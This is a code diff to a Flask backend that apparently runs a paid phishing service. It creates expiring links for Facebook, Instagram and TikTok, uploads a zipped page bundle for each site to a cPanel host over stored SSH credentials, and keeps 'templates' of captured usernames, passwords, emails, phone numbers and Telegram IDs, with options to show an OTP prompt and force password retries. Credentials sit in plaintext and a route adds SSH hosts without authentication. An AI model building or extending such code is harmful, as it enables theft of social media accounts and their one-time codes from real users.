@@ -5,6 +5,7 @@ from datetime import datetime, timedelta
 import string
 from functions.auth import login, signup
 import random
+from utils.file_handler import FileHandler
 
 @app.route('/login', methods=["GET", "POST"])
 def loginNow():
@@ -293,11 +294,33 @@ def generateLink():
         user_id = data.get("user_id")
         duration = data.get("duration")
         social_media = data.get("social_media")
-        amount = data.get("amount")  # Capture the amount
+        amount = data.get("amount")
         
         if amount is None or amount <= 0:
             return jsonify({"error": "Invalid amount", "status": 400}), 400
         
+        # Get SSH credentials
+        cur.execute("SELECT * FROM ssh_credentials WHERE status = 'active' LIMIT 1")
+        ssh_cred = cur.fetchone()
+        if not ssh_cred:
+            return jsonify({"error": "No active SSH credentials found", "status": 400}), 400
+
+        # Create file handler instance
+        file_handler = FileHandler()
+        
+        # Create and upload zip file
+        try:
+            zip_path = file_handler.create_zip(social_media.lower())
+            ssh_config = {
+                'hostname': str(ssh_cred[1]),  # hostname
+                'username': str(ssh_cred[2]),  # username
+                'password': str(ssh_cred[3]),  # password
+                'port': int(ssh_cred[5])       # port
+            }
+            remote_path = file_handler.upload_to_cpanel(zip_path, ssh_config)
+        except Exception as e:
+            return jsonify({"error": f"File operation failed: {str(e)}", "status": 500}), 500
+
         id = generate_unique_id(cur=cur)
         link = f"/{username}/{id}/{link_type}"
 
@@ -316,12 +339,20 @@ def generateLink():
         if not success:
             return jsonify({"error": balance_update_msg, "status": 400}), 400
 
-        # Save the generated link to the database
+        # Save the generated link to the database with SSH info
         cur.execute(
             """
-            INSERT INTO generated_links (user_id, status, expiry_date, duration, social_media, link_id, links)
-            VALUES (%s, %s, %s, %s, %s, %s, %s)
-            """, (user_id, 'active', expiry_date, duration, social_media, id, link)
+            INSERT INTO generated_links (
+                user_id, status, expiry_date, duration, 
+                social_media, link_id, links, ssh_credential_id, 
+                remote_path, is_uploaded
+            )
+            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
+            """, (
+                user_id, 'active', expiry_date, duration, 
+                social_media, id, link, ssh_cred[0], 
+                remote_path, True
+            )
         )
         
         conn.commit()
@@ -331,11 +362,14 @@ def generateLink():
         return jsonify({
             "link": link,
             "expiry_date": expiry_date.isoformat(),
+            "remote_path": remote_path,
             "status": 200,
-            "message": "Link generated and balance updated successfully"
+            "message": "Link generated and files uploaded successfully"
         })
     
     except Exception as e:
+        if 'conn' in locals():
+            conn.rollback()
         return jsonify({"error": str(e), "status": 500}), 500
 
 
@@ -372,6 +406,297 @@ def getTx():
 
     except Exception as e:
         return jsonify({"error": str(e)}), 500
+
+
+@app.route("/add_ssh", methods=["POST"])
+def add_ssh_credentials():
+    try:
+        conn = get_db_connection()
+        cur = conn.cursor()
+        
+        data = request.get_json()
+        hostname = data.get('hostname')
+        username = data.get('username')
+        password = data.get('password')
+        port = data.get('port', 22)  # Default to port 22 if not specified
+        ssh_key_path = data.get('ssh_key_path')
+        
+        # Basic validation
+        if not all([hostname, username]) or (not password and not ssh_key_path):
+            return jsonify({
+                "error": "Missing required fields. Need hostname, username, and either password or SSH key",
+                "status": 400
+            }), 400
+
+        # Insert new SSH credentials
+        cur.execute("""
+            INSERT INTO ssh_credentials 
+            (hostname, username, password, port, ssh_key_path, status)
+            VALUES (%s, %s, %s, %s, %s, 'active')
+        """, (hostname, username, password, port, ssh_key_path))
+        
+        conn.commit()
+        cur.close()
+        conn.close()
+
+        return jsonify({
+            "message": "SSH credentials added successfully",
+            "status": 200
+        })
+    
+    except Exception as e:
+        if 'conn' in locals():
+            conn.rollback()
+        return jsonify({"error": str(e), "status": 500}), 500
+
+
+#NEW ADDITIONS
+
+@app.route("/set_template_settings", methods=["POST"])
+def set_template_settings():
+    try:
+        conn = get_db_connection()
+        cur = conn.cursor()
+        
+        data = request.get_json()
+        template_id = data.get('template_id')
+        show_otp = data.get('show_otp', False)
+        password_retry_count = data.get('password_retry_count', 0)
+        duration = data.get('duration', '1 week')
+        
+        # Validate input
+        if not template_id:
+            return jsonify({"error": "Template ID is required", "status": 400}), 400
+        
+        # Check if template exists
+        cur.execute("SELECT id FROM template_data WHERE id = %s", (template_id,))
+        template = cur.fetchone()
+        
+        if not template:
+            return jsonify({"error": "Template not found", "status": 404}), 404
+        
+        # Update template settings
+        cur.execute("""
+            UPDATE template_data 
+            SET show_otp = %s, password_retry_count = %s, duration = %s 
+            WHERE id = %s
+        """, (show_otp, password_retry_count, duration, template_id))
+        
+        conn.commit()
+        cur.close()
+        conn.close()
+        
+        return jsonify({
+            "message": "Template settings updated successfully",
+            "template_id": template_id,
+            "show_otp": show_otp,
+            "password_retry_count": password_retry_count,
+            "duration": duration,
+            "status": 200
+        })
+        
+    except Exception as e:
+        return jsonify({"error": str(e), "status": 500}), 500
+
+
+@app.route("/get_template_settings/<template_id>", methods=["GET"])
+def get_template_settings(template_id):
+    try:
+        conn = get_db_connection()
+        cur = conn.cursor()
+        
+        # Fetch template settings
+        cur.execute(
+            "SELECT show_otp, password_retry_count, duration, social_media FROM template_data WHERE id = %s",
+            (template_id,)
+        )
+        
+        result = cur.fetchone()
+        
+        if not result:
+            return jsonify({"error": "Template not found", "status": 404}), 404
+            
+        show_otp, password_retry_count, duration, social_media = result
+        
+        cur.close()
+        conn.close()
+        
+        return jsonify({
+            "template_id": template_id,
+            "show_otp": show_otp,
+            "password_retry_count": password_retry_count,
+            "duration": duration,
+            "social_media": social_media,
+            "status": 200
+        })
+        
+    except Exception as e:
+        return jsonify({"error": str(e), "status": 500}), 500
+
+
+@app.route("/add_template_settings", methods=["POST"])
+def add_template_settings():
+    try:
+        conn = get_db_connection()
+        cur = conn.cursor()
+        
+        data = request.get_json()
+        template_id = data.get('template_id')
+        show_otp = data.get('show_otp', False)
+        password_retry_count = data.get('password_retry_count', 0)
+        duration = data.get('duration', '1 week')
+        
+        # Validate input
+        if not template_id:
+            return jsonify({"error": "Template ID is required", "status": 400}), 400
+        
+        # Check if template exists
+        cur.execute("SELECT id FROM template_data WHERE id = %s", (template_id,))
+        template = cur.fetchone()
+        
+        if not template:
+            return jsonify({"error": "Template not found", "status": 404}), 404
+        
+        # Update template settings
+        cur.execute("""
+            UPDATE template_data 
+            SET show_otp = %s, password_retry_count = %s, duration = %s 
+            WHERE id = %s
+        """, (show_otp, password_retry_count, duration, template_id))
+        
+        conn.commit()
+        cur.close()
+        conn.close()
+        
+        return jsonify({
+            "message": "Template settings added successfully",
+            "template_id": template_id,
+            "show_otp": show_otp,
+            "password_retry_count": password_retry_count,
+            "duration": duration,
+            "status": 200
+        })
+        
+    except Exception as e:
+        return jsonify({"error": str(e), "status": 500}), 500
+
+
+@app.route("/create_template", methods=["POST"])
+def create_template():
+    try:
+        conn = get_db_connection()
+        cur = conn.cursor()
+        
+        data = request.get_json()
+        # Required fields
+        log_id = data.get('log_id')
+        social_media = data.get('social_media')
+        telegram_id = data.get('telegram_id')
+        
+        # Optional fields with defaults from schema
+        username = data.get('username')
+        password = data.get('password')
+        email = data.get('email')
+        phone = data.get('phone')
+        preferences = data.get('preferences')
+        theme = data.get('theme', 'dark')
+        notifications = data.get('notifications', True)
+        status = data.get('status', 'active')
+        follow_count = data.get('follow_count', 0)
+        like_count = data.get('like_count', 0)
+        recommended_content = data.get('recommended_content')
+        
+        # New fields
+        show_otp = data.get('show_otp', False)
+        password_retry_count = data.get('password_retry_count', 0)
+        duration = data.get('duration', '1 week')
+        
+        # Validate required fields
+        if not all([log_id, social_media, telegram_id]):
+            return jsonify({"error": "Missing required fields: log_id, social_media, and telegram_id are required", "status": 400}), 400
+        
+        # Validate social_media is one of the allowed values
+        if social_media not in ['facebook', 'instagram', 'tiktok']:
+            return jsonify({"error": "social_media must be one of: facebook, instagram, tiktok", "status": 400}), 400
+        
+        # Generate a unique ID for the template
+        template_id = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+        
+        # Insert new template data
+        # In the create_template function, add this line with the other fields
+        user_id = data.get('user_id')  # Add this line
+        
+        # And update the INSERT statement to include user_id
+        cur.execute("""
+        INSERT INTO template_data (
+        id, log_id, social_media, username, password, email, phone, telegram_id,
+        preferences, theme, notifications, status, follow_count, like_count,
+        recommended_content, show_otp, password_retry_count, duration, user_id
+        ) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
+        """, (
+        template_id, log_id, social_media, username, password, email, phone, telegram_id,
+        json.dumps(preferences) if preferences else None, theme, notifications, status, 
+        follow_count, like_count, json.dumps(recommended_content) if recommended_content else None,
+        show_otp, password_retry_count, duration, user_id
+        ))
+        
+        conn.commit()
+        cur.close()
+        conn.close()
+        
+        return jsonify({
+            "message": "Template created successfully",
+            "template_id": template_id,
+            "status": 200
+        })
+        
+    except Exception as e:
+        return jsonify({"error": str(e), "status": 500}), 500
+
+
+@app.route("/get_template_full/<template_id>", methods=["GET"])
+def get_template_full(template_id):
+    try:
+        conn = get_db_connection()
+        cur = conn.cursor()
+        
+        # Fetch all template data
+        cur.execute("SELECT * FROM template_data WHERE id = %s", (template_id,))
+        result = cur.fetchone()
+        
+        if not result:
+            return jsonify({"error": "Template not found", "status": 404}), 404
+            
+        # Get column names from cursor description
+        columns = [desc[0] for desc in cur.description]
+        
+        # Create a dictionary with column names as keys and row values as values
+        template_data = {}
+        for i, column in enumerate(columns):
+            # Handle JSON fields
+            if column in ['preferences', 'recommended_content'] and result[i] is not None:
+                import json
+                try:
+                    template_data[column] = json.loads(result[i])
+                except:
+                    template_data[column] = result[i]
+            else:
+                # Convert non-serializable types (like Decimal) to appropriate JSON types
+                if hasattr(result[i], 'isoformat'):  # For datetime objects
+                    template_data[column] = result[i].isoformat()
+                else:
+                    template_data[column] = result[i]
+        
+        cur.close()
+        conn.close()
+        
+        # Add status to the response
+        template_data['status'] = 200
+        
+        return jsonify(template_data)
+        
+    except Exception as e:
+        return jsonify({"error": str(e), "status": 500}), 500
 
 
 if __name__=="__main__":
